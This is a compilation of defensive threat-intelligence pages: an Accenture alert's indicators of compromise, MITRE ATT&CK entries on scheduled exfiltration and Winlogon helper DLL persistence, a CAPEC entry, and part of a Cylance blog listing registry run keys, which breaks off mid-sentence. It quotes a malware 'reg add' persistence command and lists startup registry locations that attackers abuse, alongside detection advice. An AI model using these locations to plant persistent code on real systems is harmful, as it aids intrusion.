7188f76ca5fbc6e57d23ba97655b293d5356933e2ab5261e423b3f205fe305ee 388d6b38f21c79e0e2ad7ead1108025b8bb3486d8d29f2468b5cb0e54bff11d2 37333ecdd16b1ecbcd070b202492c1870dafd799f6299a420cdcc8a9e149cc93 For threat hunting, it is also useful to examine the content of the following folders and look out for anomalous data: \xe2\x80\xa2 %temp%\\AYRUNSC.exe \xe2\x80\xa2 %temp%\\PTL.AYM \xe2\x80\xa2 %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\GppiTEMms.lnk \xe2\x80\xa2 %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\EaahLDRej.lnk \xe2\x80\xa2 %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\BnorTEPkh.lnk \xe2\x80\xa2 A mutex named jH10689DS, 2N6541mb, or rV6880B9. CONTACT US Joshua Ray joshua.a.ray@accenture.com Bart Parys bart.parys@accenture.com mailto:joshua.a.ray@accenture.com mailto:bart.parys@accenture.com ABOUT ACCENTURE Accenture is a leading global professional services company, providing a broad range of services and solutions in strategy, consulting, digital, technology and operations. Combining unmatched experience and specialized skills across more than 40 industries and all business functions\xe2\x80\x94 underpinned by the world\xe2\x80\x99s largest delivery network\xe2\x80\x94Accenture works at the intersection of business and technology to help clients improve their performance and create sustainable value for their stakeholders. With approximately 425,000 people serving clients in more than 120 countries, Accenture drives innovation to improve the way the world works and lives. Visit us at www.accenture.com ABOUT ACCENTURE SECURITY Accenture Security helps organizations build resilience from the inside out, so they can confidently focus on innovation and growth. Leveraging its global network of cybersecurity labs, deep industry understanding across client value chains and services that span the security lifecycle, Accenture protects organization\xe2\x80\x99s valuable assets, end-to-end. With services that include strategy and risk management, cyber defense, digital identity, application security and managed security, Accenture enables businesses around the world to defend against known sophisticated threats, and the unknown. Follow us @AccentureSecure on Twitter or visit the Accenture Security blog. LEGAL NOTICE & DISCLAIMER: Given the inherent nature of threat intelligence, the content contained in this alert is based on information gathered and understood at the time of its creation. It is subject to change. ACCENTURE PROVIDES THE INFORMATION ON AN \xe2\x80\x9cAS-IS\xe2\x80\x9d BASIS WITHOUT REPRESENTATION OR WARRANTY AND ACCEPTS NO LIABILITY FOR ANY ACTION OR FAILURE TO ACT TAKEN IN RESPONSE TO THE INFORMATION CONTAINED OR REFERENCED IN THIS ALERT. \xc2\xa9 2018 Accenture. All rights reserved. Accenture, the Accenture logo, iDefense and other trademarks, service marks, and designs are registered or unregistered trademarks of Accenture and its subsidiaries in the United States and in foreign countries. All trademarks are properties of their respective owners. All materials are intended for the original recipient only. The reproduction and distribution of this material is forbidden without express written permission from iDefense. The opinions, statements, and assessments in this report are solely those of the individual author(s) and do not constitute legal advice, nor do they necessarily reflect the views of Accenture, its subsidiaries, or affiliates. http://www.accenture.com/
"Scheduled Transfer - Enterprise | MITRE ATT&CK\xe2\x84\xa2 Matrices Tactics PRE-ATT&CK Enterprise Mobile Techniques PRE-ATT&CK Enterprise Mobile Mitigations Enterprise Mobile Groups Software Resources General Information Getting Started ATT&CKcon Working with ATT&CK FAQ Updates Previous Versions Related Projects Blog\xc2 Contribute Register to stream ATT&CKcon 2.0 October 29-30 ENTERPRISE ENTERPRISE MOBILE PRE-ATT&CK TECHNIQUES All Initial Access Drive-by Compromise Exploit Public-Facing Application External Remote Services Hardware Additions Replication Through Removable Media Spearphishing Attachment Spearphishing Link Spearphishing via Service Supply Chain Compromise Trusted Relationship Valid Accounts Execution AppleScript CMSTP Command-Line Interface Compiled HTML File Control Panel Items Dynamic Data Exchange Execution through API Execution through Module Load Exploitation for Client Execution Graphical User Interface InstallUtil Launchctl Local Job Scheduling LSASS Driver Mshta PowerShell Regsvcs/Regasm Regsvr32 Rundll32 Scheduled Task Scripting Service Execution Signed Binary Proxy Execution Signed Script Proxy Execution Source Space after Filename Third-party Software Trap Trusted Developer Utilities User Execution Windows Management Instrumentation Windows Remote Management XSL Script Processing Persistence .bash_profile and .bashrc Accessibility Features Account Manipulation AppCert DLLs AppInit DLLs Application Shimming Authentication Package BITS Jobs Bootkit Browser Extensions Change Default File Association Component Firmware Component Object Model Hijacking Create Account DLL Search Order Hijacking Dylib Hijacking External Remote Services File System Permissions Weakness Hidden Files and Directories Hooking Hypervisor Image File Execution Options Injection Kernel Modules and Extensions Launch Agent Launch Daemon Launchctl LC_LOAD_DYLIB Addition Local Job Scheduling Login Item Logon Scripts LSASS Driver Modify Existing Service Netsh Helper DLL New Service Office Application Startup Path Interception Plist Modification Port Knocking Port Monitors Rc.common Re-opened Applications Redundant Access Registry Run Keys / Startup Folder Scheduled Task Screensaver Security Support Provider Service Registry Permissions Weakness Setuid and Setgid Shortcut Modification SIP and Trust Provider Hijacking Startup Items System Firmware Systemd Service Time Providers Trap Valid Accounts Web Shell Windows Management Instrumentation Event Subscription Winlogon Helper DLL Privilege Escalation Access Token Manipulation Accessibility Features AppCert DLLs AppInit DLLs Application Shimming Bypass User Account Control DLL Search Order Hijacking Dylib Hijacking Exploitation for Privilege Escalation Extra Window Memory Injection File System Permissions Weakness Hooking Image File Execution Options Injection Launch Daemon New Service Path Interception Plist Modification Port Monitors Process Injection Scheduled Task Service Registry Permissions Weakness Setuid and Setgid SID-History Injection Startup Items Sudo Sudo Caching Valid Accounts Web Shell Defense Evasion Access Token Manipulation Binary Padding BITS Jobs Bypass User Account Control Clear Command History CMSTP Code Signing Compile After Delivery Compiled HTML File Component Firmware Component Object Model Hijacking Control Panel Items DCShadow Deobfuscate/Decode Files or Information Disabling Security Tools DLL Search Order Hijacking DLL Side-Loading Execution Guardrails Exploitation for Defense Evasion Extra Window Memory Injection File Deletion File Permissions Modification File System Logical Offsets Gatekeeper Bypass Group Policy Modification Hidden Files and Directories Hidden Users Hidden Window HISTCONTROL Image File Execution Options Injection Indicator Blocking Indicator Removal from Tools Indicator Removal on Host Indirect Command Execution Install Root Certificate InstallUtil Launchctl LC_MAIN Hijacking Masquerading Modify Registry Mshta Network Share Connection Removal NTFS File Attributes Obfuscated Files or Information Plist Modification Port Knocking Process Doppelg\xc3\xa4nging Process Hollowing Process Injection Redundant Access Regsvcs/Regasm Regsvr32 Rootkit Rundll32 Scripting Signed Binary Proxy Execution Signed Script Proxy Execution SIP and Trust Provider Hijacking Software Packing Space after Filename Template Injection Timestomp Trusted Developer Utilities Valid Accounts Virtualization/Sandbox Evasion Web Service XSL Script Processing Credential Access Account Manipulation Bash History Brute Force Credential Dumping Credentials in Files Credentials in Registry Exploitation for Credential Access Forced Authentication Hooking Input Capture Input Prompt Kerberoasting Keychain LLMNR/NBT-NS Poisoning and Relay Network Sniffing Password Filter DLL Private Keys Securityd Memory Two-Factor Authentication Interception Discovery Account Discovery Application Window Discovery Browser Bookmark Discovery Domain Trust Discovery File and Directory Discovery Network Service Scanning Network Share Discovery Network Sniffing Password Policy Discovery Peripheral Device Discovery Permission Groups Discovery Process Discovery Query Registry Remote System Discovery Security Software Discovery System Information Discovery System Network Configuration Discovery System Network Connections Discovery System Owner/User Discovery System Service Discovery System Time Discovery Virtualization/Sandbox Evasion Lateral Movement AppleScript Application Deployment Software Distributed Component Object Model Exploitation of Remote Services Logon Scripts Pass the Hash Pass the Ticket Remote Desktop Protocol Remote File Copy Remote Services Replication Through Removable Media Shared Webroot SSH Hijacking Taint Shared Content Third-party Software Windows Admin Shares Windows Remote Management Collection Audio Capture Automated Collection Clipboard Data Data from Information Repositories Data from Local System Data from Network Shared Drive Data from Removable Media Data Staged Email Collection Input Capture Man in the Browser Screen Capture Video Capture Command and Control Commonly Used Port Communication Through Removable Media Connection Proxy Custom Command and Control Protocol Custom Cryptographic Protocol Data Encoding Data Obfuscation Domain Fronting Domain Generation Algorithms Fallback Channels Multi-hop Proxy Multi-Stage Channels Multiband Communication Multilayer Encryption Port Knocking Remote Access Tools Remote File Copy Standard Application Layer Protocol Standard Cryptographic Protocol Standard Non-Application Layer Protocol Uncommonly Used Port Web Service Exfiltration Automated Exfiltration Data Compressed Data Encrypted Data Transfer Size Limits Exfiltration Over Alternative Protocol Exfiltration Over Command and Control Channel Exfiltration Over Other Network Medium Exfiltration Over Physical Medium Scheduled Transfer Impact Data Destruction Data Encrypted for Impact Defacement Disk Content Wipe Disk Structure Wipe Endpoint Denial of Service Firmware Corruption Inhibit System Recovery Network Denial of Service Resource Hijacking Runtime Data Manipulation Service Stop Stored Data Manipulation Transmitted Data Manipulation Home Techniques Enterprise Scheduled Transfer Scheduled Transfer Data exfiltration may be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability. When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over Command and Control Channel and Exfiltration Over Alternative Protocol. ID:\xc2 T1029 Tactic: Exfiltration Platform:\xc2 Linux, macOS, Windows Data Sources:\xc2 Netflow/Enclave netflow, Process use of network, Process monitoring Requires Network:\xc2 Yes Version:\xc2 1.0 Mitigations Mitigation Description Network Intrusion Prevention Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools. [1] Examples Name Description ADVSTORESHELL ADVSTORESHELL collects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes. [5] Cobalt Strike Cobalt Strike can set its ""beacon"" payload to reach out to the C2 server on an arbitrary and random interval. In addition it will break large data sets into smaller chunks for exfiltration. [2] Dipsind Dipsind can be configured to only run during normal working hours, which would make its communications harder to distinguish from normal traffic. [6] jRAT jRAT can be configured to reconnect at certain intervals. [8] Kazuar Kazuar can sleep for a specific time and be set to communicate at specific intervals. [4] LightNeuron LightNeuron can be configured to exfiltrate data during nighttime or working hours. [9] Linfo Linfo creates a backdoor through which remote attackers can change the frequency at which compromised hosts contact remote C2 infrastructure. [3] POWERSTATS POWERSTATS can sleep for a given number of seconds. [7] Detection Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious. References Gardiner, J., Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. Strategic Cyber LLC. (2017, March 14). Cobalt Strike Manual. Retrieved May 24, 2017. Zhou, R. (2012, May 15). Backdoor.Linfo. Retrieved February 23, 2018. Levene, B, et al. (2017, May 03). Kazuar: Multiplatform Espionage Backdoor with API Access. Retrieved July 17, 2018. ESET. (2016, October). En Route with Sednit - Part 2: Observing the Comings and Goings. Retrieved November 21, 2016. Windows Defender Advanced Threat Hunting Team. (2016, April 29). PLATINUM: Targeted attacks in South and Southeast Asia. Retrieved February 15, 2018. Singh, S. et al.. (2018, March 13). Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign. Retrieved April 11, 2018. Kamluk, V. & Gostev, A. (2016, February). Adwind - A Cross-Platform RAT. Retrieved April 23, 2019. Faou, M. (2019, May). Turla LightNeuron: One email away from remote code execution. Retrieved June 24, 2019. Copyright \xc2\xa9 2015-2019, The MITRE Corporation. MITRE ATT&CK and ATT&CK are trademarks of The MITRE Corporation. Privacy Policy Terms of Use @MITREattack Contact
"Winlogon Helper DLL - Enterprise | MITRE ATT&CK\xe2\x84\xa2 Matrices Tactics PRE-ATT&CK Enterprise Mobile Techniques PRE-ATT&CK Enterprise Mobile Mitigations Enterprise Mobile Groups Software Resources General Information Getting Started ATT&CKcon Working with ATT&CK FAQ Updates Previous Versions Related Projects Blog\xc2 Contribute Register to stream ATT&CKcon 2.0 October 29-30 ENTERPRISE ENTERPRISE MOBILE PRE-ATT&CK TECHNIQUES All Initial Access Drive-by Compromise Exploit Public-Facing Application External Remote Services Hardware Additions Replication Through Removable Media Spearphishing Attachment Spearphishing Link Spearphishing via Service Supply Chain Compromise Trusted Relationship Valid Accounts Execution AppleScript CMSTP Command-Line Interface Compiled HTML File Control Panel Items Dynamic Data Exchange Execution through API Execution through Module Load Exploitation for Client Execution Graphical User Interface InstallUtil Launchctl Local Job Scheduling LSASS Driver Mshta PowerShell Regsvcs/Regasm Regsvr32 Rundll32 Scheduled Task Scripting Service Execution Signed Binary Proxy Execution Signed Script Proxy Execution Source Space after Filename Third-party Software Trap Trusted Developer Utilities User Execution Windows Management Instrumentation Windows Remote Management XSL Script Processing Persistence .bash_profile and .bashrc Accessibility Features Account Manipulation AppCert DLLs AppInit DLLs Application Shimming Authentication Package BITS Jobs Bootkit Browser Extensions Change Default File Association Component Firmware Component Object Model Hijacking Create Account DLL Search Order Hijacking Dylib Hijacking External Remote Services File System Permissions Weakness Hidden Files and Directories Hooking Hypervisor Image File Execution Options Injection Kernel Modules and Extensions Launch Agent Launch Daemon Launchctl LC_LOAD_DYLIB Addition Local Job Scheduling Login Item Logon Scripts LSASS Driver Modify Existing Service Netsh Helper DLL New Service Office Application Startup Path Interception Plist Modification Port Knocking Port Monitors Rc.common Re-opened Applications Redundant Access Registry Run Keys / Startup Folder Scheduled Task Screensaver Security Support Provider Service Registry Permissions Weakness Setuid and Setgid Shortcut Modification SIP and Trust Provider Hijacking Startup Items System Firmware Systemd Service Time Providers Trap Valid Accounts Web Shell Windows Management Instrumentation Event Subscription Winlogon Helper DLL Privilege Escalation Access Token Manipulation Accessibility Features AppCert DLLs AppInit DLLs Application Shimming Bypass User Account Control DLL Search Order Hijacking Dylib Hijacking Exploitation for Privilege Escalation Extra Window Memory Injection File System Permissions Weakness Hooking Image File Execution Options Injection Launch Daemon New Service Path Interception Plist Modification Port Monitors Process Injection Scheduled Task Service Registry Permissions Weakness Setuid and Setgid SID-History Injection Startup Items Sudo Sudo Caching Valid Accounts Web Shell Defense Evasion Access Token Manipulation Binary Padding BITS Jobs Bypass User Account Control Clear Command History CMSTP Code Signing Compile After Delivery Compiled HTML File Component Firmware Component Object Model Hijacking Control Panel Items DCShadow Deobfuscate/Decode Files or Information Disabling Security Tools DLL Search Order Hijacking DLL Side-Loading Execution Guardrails Exploitation for Defense Evasion Extra Window Memory Injection File Deletion File Permissions Modification File System Logical Offsets Gatekeeper Bypass Group Policy Modification Hidden Files and Directories Hidden Users Hidden Window HISTCONTROL Image File Execution Options Injection Indicator Blocking Indicator Removal from Tools Indicator Removal on Host Indirect Command Execution Install Root Certificate InstallUtil Launchctl LC_MAIN Hijacking Masquerading Modify Registry Mshta Network Share Connection Removal NTFS File Attributes Obfuscated Files or Information Plist Modification Port Knocking Process Doppelg\xc3\xa4nging Process Hollowing Process Injection Redundant Access Regsvcs/Regasm Regsvr32 Rootkit Rundll32 Scripting Signed Binary Proxy Execution Signed Script Proxy Execution SIP and Trust Provider Hijacking Software Packing Space after Filename Template Injection Timestomp Trusted Developer Utilities Valid Accounts Virtualization/Sandbox Evasion Web Service XSL Script Processing Credential Access Account Manipulation Bash History Brute Force Credential Dumping Credentials in Files Credentials in Registry Exploitation for Credential Access Forced Authentication Hooking Input Capture Input Prompt Kerberoasting Keychain LLMNR/NBT-NS Poisoning and Relay Network Sniffing Password Filter DLL Private Keys Securityd Memory Two-Factor Authentication Interception Discovery Account Discovery Application Window Discovery Browser Bookmark Discovery Domain Trust Discovery File and Directory Discovery Network Service Scanning Network Share Discovery Network Sniffing Password Policy Discovery Peripheral Device Discovery Permission Groups Discovery Process Discovery Query Registry Remote System Discovery Security Software Discovery System Information Discovery System Network Configuration Discovery System Network Connections Discovery System Owner/User Discovery System Service Discovery System Time Discovery Virtualization/Sandbox Evasion Lateral Movement AppleScript Application Deployment Software Distributed Component Object Model Exploitation of Remote Services Logon Scripts Pass the Hash Pass the Ticket Remote Desktop Protocol Remote File Copy Remote Services Replication Through Removable Media Shared Webroot SSH Hijacking Taint Shared Content Third-party Software Windows Admin Shares Windows Remote Management Collection Audio Capture Automated Collection Clipboard Data Data from Information Repositories Data from Local System Data from Network Shared Drive Data from Removable Media Data Staged Email Collection Input Capture Man in the Browser Screen Capture Video Capture Command and Control Commonly Used Port Communication Through Removable Media Connection Proxy Custom Command and Control Protocol Custom Cryptographic Protocol Data Encoding Data Obfuscation Domain Fronting Domain Generation Algorithms Fallback Channels Multi-hop Proxy Multi-Stage Channels Multiband Communication Multilayer Encryption Port Knocking Remote Access Tools Remote File Copy Standard Application Layer Protocol Standard Cryptographic Protocol Standard Non-Application Layer Protocol Uncommonly Used Port Web Service Exfiltration Automated Exfiltration Data Compressed Data Encrypted Data Transfer Size Limits Exfiltration Over Alternative Protocol Exfiltration Over Command and Control Channel Exfiltration Over Other Network Medium Exfiltration Over Physical Medium Scheduled Transfer Impact Data Destruction Data Encrypted for Impact Defacement Disk Content Wipe Disk Structure Wipe Endpoint Denial of Service Firmware Corruption Inhibit System Recovery Network Denial of Service Resource Hijacking Runtime Data Manipulation Service Stop Stored Data Manipulation Transmitted Data Manipulation Home Techniques Enterprise Winlogon Helper DLL Winlogon Helper DLL Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\\Software[Wow6432Node]Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are used to manage additional helper programs and functionalities that support Winlogon. [1] Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: [1] Winlogon\\Notify - points to notification package DLLs that handle Winlogon events Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on Adversaries may take advantage of these features to repeatedly execute malicious code and establish Persistence. ID:\xc2 T1004 Tactic: Persistence Platform:\xc2 Windows Permissions Required:\xc2 Administrator, SYSTEM Data Sources:\xc2 Windows Registry, File monitoring, Process monitoring CAPEC ID: CAPEC-579 Contributors:\xc2 Praetorian Version:\xc2 1.0 Mitigations Mitigation Description Execution Prevention Identify and block potentially malicious software that may be executed through the Winlogon helper process by using whitelisting tools like AppLocker that are capable of auditing and/or blocking unknown DLLs. [2] [3] [4] User Account Management Limit the privileges of user accounts so that only authorized administrators can perform Winlogon helper changes. Examples Name Description Cannon Cannon adds the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon to establish persistence. [7] Dipsind A Dipsind variant registers as a Winlogon Event Notify DLL to establish persistence. [5] Gazer Gazer can establish persistence by setting the value \xe2\x80\x9cShell\xe2\x80\x9d with \xe2\x80\x9cexplorer.exe, %malware_pathfile%\xe2\x80\x9d under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon. [6] KeyBoy KeyBoy issues the command reg add \xe2\x80\x9cHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\xe2\x80\x9d to achieve persistence. [9] [10] Remexi Remexi achieves persistence using Userinit by adding the Registry key HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit. [8] Tropic Trooper Tropic Trooper creates the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell and sets the value to establish persistence. [12] Turla Turla established persistence by adding a Shell value under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion]Winlogon. [11] Detection Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. [13] New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious. Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement. References Langendorf, S. (2013, September 24). Windows Registry Persistence, Part 2: The Run Keys and Search-Order. Retrieved April 11, 2018. Beechey, J. (2010, December). Application Whitelisting: Panacea or Propaganda?. Retrieved November 18, 2014. Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016. NSA Information Assurance Directorate. (2014, August). Application Whitelisting Using Microsoft AppLocker. Retrieved March 31, 2016. Windows Defender Advanced Threat Hunting Team. (2016, April 29). PLATINUM: Targeted attacks in South and Southeast Asia. Retrieved February 15, 2018. ESET. (2017, August). Gazing at Gazer: Turla\xe2\x80\x99s new second stage backdoor. Retrieved September 14, 2017. Falcone, R., Lee, B. (2018, November 20). Sofacy Continues Global Attacks and Wheels Out New \xe2\x80\x98Cannon\xe2\x80\x99 Trojan. Retrieved November 26, 2018. Legezo, D. (2019, January 30). Chafer used Remexi malware to spy on Iran-based foreign diplomatic entities. Retrieved April 17, 2019. Parys, B. (2017, February 11). The KeyBoys are back in town. Retrieved June 13, 2019. Hulcoop, A., et al. (2016, November 17). It\xe2\x80\x99s Parliamentary KeyBoy and the targeting of the Tibetan Community. Retrieved June 13, 2019. ESET, et al. (2018, January). Diplomats in Eastern Europe bitten by a Turla mosquito. Retrieved July 3, 2018. Ray, V. (2016, November 22). Tropic Trooper Targets Taiwanese Government and Fossil Fuel Provider With Poison Ivy. Retrieved November 9, 2018. Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016. Copyright \xc2\xa9 2015-2019, The MITRE Corporation. MITRE ATT&CK and ATT&CK are trademarks of The MITRE Corporation. Privacy Policy Terms of Use @MITREattack Contact
"CAPEC - CAPEC-579: Replace Winlogon Helper DLL (Version 3.1) Common Attack Pattern Enumeration and Classification A Community Resource for Identifying and Understanding Attacks Home > CAPEC List > CAPEC-579: Replace Winlogon Helper DLL (Version 3.1) \xc2 ID Lookup: Home About Overview Documents Use Cases Resources Glossary FAQs CAPEC List Latest Version Downloads Reports Archive Community Community Citations Vendor Usage Discussion List Related Activities News Current News Free Newsletter CAPEC on Twitter CAPEC on News Archive Search CAPEC-579: Replace Winlogon Helper DLL Attack Pattern ID: 579 Abstraction: Detailed Status: Draft Presentation Filter: Basic Complete Description Winlogon is a part of Windows that performs logon actions. In Windows systems prior to Windows Vista, a registry key can be modified that causes Winlogon to load a DLL on startup. Adversaries may take advantage of this feature to load adversarial code at startup. Relationships The table(s) below shows the other attack patterns and high level categories that are related to this attack pattern. These relationships are defined as ChildOf, ParentOf, MemberOf and give insight to similar items that may exist at higher and lower levels of abstraction. In addition, relationships such as CanFollow, PeerOf, and CanAlsoBe are defined to show similar attack patterns that the user may want to explore. Nature Type ID Name ChildOf Standard Attack Pattern - A standard level attack pattern in CAPEC is focused on a specific methodology or technique used in an attack. It is often seen as a singular piece of a fully executed attack. A standard attack pattern is meant to provide sufficient details to understand the specific technique and how it attempts to accomplish a desired goal. A standard level attack pattern is a specific type of a more abstract meta level attack pattern. 542 Targeted Malware Mitigations Changes to registry entries in ""HKLM\\Software\\Microsoft\\Windows NT\\Winlogon\\Notify"" that do not correlate with known software, patch cycles, etc are suspicious. New DLLs written to System32 which do not correlate with known good software or patching may be suspicious. Taxonomy Mappings Relevant to the ATT&CK taxonomy mapping Entry ID Entry Name 1004 Winlogon helper DLL Content History Submissions Submission Date Submitter Organization 2015-11-09 CAPEC Content Team The MITRE Corporation More information is available \xe2\x80\x94 Please select a different filter. Page Last Updated or Reviewed: July 31, 2018 \xc2 Use of the Common Attack Pattern Enumeration and Classification dictionary and classification taxonomy, and the associated references from this website, are subject to the Terms of Use. For more information, please email capec@mitre.org. CAPEC is sponsored by the U.S. Department of Homeland Security (DHS) Cybersecurity and Infrastructure Security Agency (CISA). Copyright \xc2\xa9 2007 - 2019, The MITRE Corporation. CAPEC and the CAPEC logo are trademarks of The MITRE Corporation. Privacy policy Terms of use Site Map Contact us \xc2
"Windows Registry Persistence, Part 2: The Run Keys and Search-Order We use cookies to provide you a relevant user experience, analyze our traffic, and provide social media features. Read More Got it Menu Research & Intel Videos Webcasts Podcasts News Resources | Cylance.com Windows Registry Persistence, Part 2: The Run Keys and Search-Order ThreatVector > Spotlight Share It: \xc2 by Scott Langendorf | September 24, 2013 ""It is only prudent never to place complete confidence in that by which we have even once been deceived."" \xe2\x80\x95 Ren\xc3\xa9 Descartes Another method of persistence that has been around for a very long time is the use of what are collectively known as the ""run keys"" in the Windows registry. As stated in\xc2 Part 1\xc2 of this blog series, the most common method up until this year has been the use of hosted services configured in the registry. The intention of this article is to present a list of registry keys that are used to persist services or applications in the order they are loaded by the operating system and then discuss some important ones. Registry Keys to Launch Persistent Services or Applications (in Load Order) The registry is accessed even before the NT kernel is loaded, so it is very important to understand what the computer is configured to load at startup. The following list of registry keys are accessed during system start in order of their use by the different windows components: 1) HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute 2) HKLM\\System\\CurrentControlSet\\Services (start value of 0 indicates kernel drivers, which load before kernel initiation) 3) HKLM\\System\\CurrentControlSet\\Services (start value of 2, auto-start and 3, manual start via SCM) 4) HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce 5) HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce 6) HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices 7) HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices 8) HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify 9) HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit 10) HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell 11) HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell 12) HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad 13) HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce 14) HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx 15) HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 16) HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 17) HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce 18) HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run 19) HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run 20) HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load 21) HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows 22) HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SharedTaskScheduler (XP, NT, W2k only) 23) HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\\\AppInit_DLLs Note: Some of these keys are also reflected under\xc2 HKLM\\Software\\wow6432node\xc2 on systems running on a 64bit architecture and with a 64bit version of Windows. I won\xe2\x80\x99t be covering each of these in this post. Before getting started, Microsoft has a great utility available to inspect all (and more) of these registry keys. The utility, called Autoruns, is freely available here. (live.sysinternals.com). Figure 1: Sysinternals Autoruns Utility Compromise Assessment As I discuss each registry location, I will occasionally demonstrate native windows commands that can be scripted to gather information related to these registry persistence locations. We do this at Cylance as part of our compromise assessment collection script. Our assessment is designed to be very low impact on the thousands of computers in your enterprise on which it runs. It is also designed to run on a regular basis (perhaps quarterly) as a means of quickly identifying abnormal behavior. We take this data and analyze it in SQL and Excel which gives us the ability to identify the ""low frequency"" outliers. For example, below we see the DLLs loaded by svchost.exe, the shared service host. We routinely see unusual DLLs that are part of a targeted attack and that endpoint AV is completely blind to. Other tools that rely on ""known indicators"" will miss them too. We do this same process for files, network IPs, prefetch files, services, scheduled tasks, etc. We look for the ""few"" by leveraging the ""many"". BootExecute Key (1) As a Windows computer powers up, the Session Manager (smss.exe) starts as the first user-mode process. Since it loads before the Windows Subsystem has loaded, it can't use standard Windows API functions and uses native API calls instead. It calls the configuration manager subsystem to load the hives listed in the following registry key:\xc2 HKLM\\SYSTEM\\CurrentControlSet\\Control\\hivelist As far as locations in the registry where malicious processes or modules can be configured to launch from, the BootExecute key is the earliest. Smss.exe will load any programs it finds listed here. By default the only entry in this string array is\xc2 autocheck autochk *\xc2 which runs Autochk during boot. If instead you see an entry such as the following in your BootExecute key, there are problems. The oddly named file will be sitting in your system32 folder, unless it has been removed by AV. You might see this presented this way in various online malware sandbox analyzers: If you decode the HEX string to text, it becomes\xc2 autocheck autochk * aHdqEPamx\xc2 which causes the malicious program to launch during startup. Search the web for other samples of this technique by using this as your search term:\xc2 site:threatexpert.com bootexecute As an Incident Responder I collect the output from Autoruns (Figure 1) from Microsoft Sysinternals (live.sysinternals.com), which can be used to view all of the registry keys being covered in this blog and is an awesome way to audit registry settings. I use this utility from the command line on machines where some behavioral or configuration anomaly has been observed. This technique is true for all registry settings covered in this article so I'll just use this first one as an example. Services Keys (2 and 3) The first process to launch during startup is winload.exe and this process reads the system registry hive to determine what drivers need to be loaded. Every device driver has a registry subkey underHKLM\\SYSTEM\\CurrentControlSet\\Services. Winload.exe is the process that shows the progress bar under the ""Starting Windows\xe2\x80\xa6"" you see during startup. Use the following command (as Administrator) to view the drivers configured to load during startup: reg query hklm\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri "".*\\.sys$"" Review of the entries under this subkey for any drivers running out of a user profile location or a temp directory. For example: C:\\WINDOWS\\TEMP\\INSTB64.SYS C:\\Users\\USERNA~1\\AppData\\Local\\Temp\\cpuz135\\cpuz135_x64.sys C:\\Windows\\TEMP\\009947~1.EXE sername\\AppData\\Local\\Temp\\ALSysIO64.sys During our compromise health assessments, we gather all of these registry locations into a database and with SQL are able to inspect the entire enterprise for unusual driver locations in the same manner as shown above. We gather these ImagePath locations into Excel and look at the 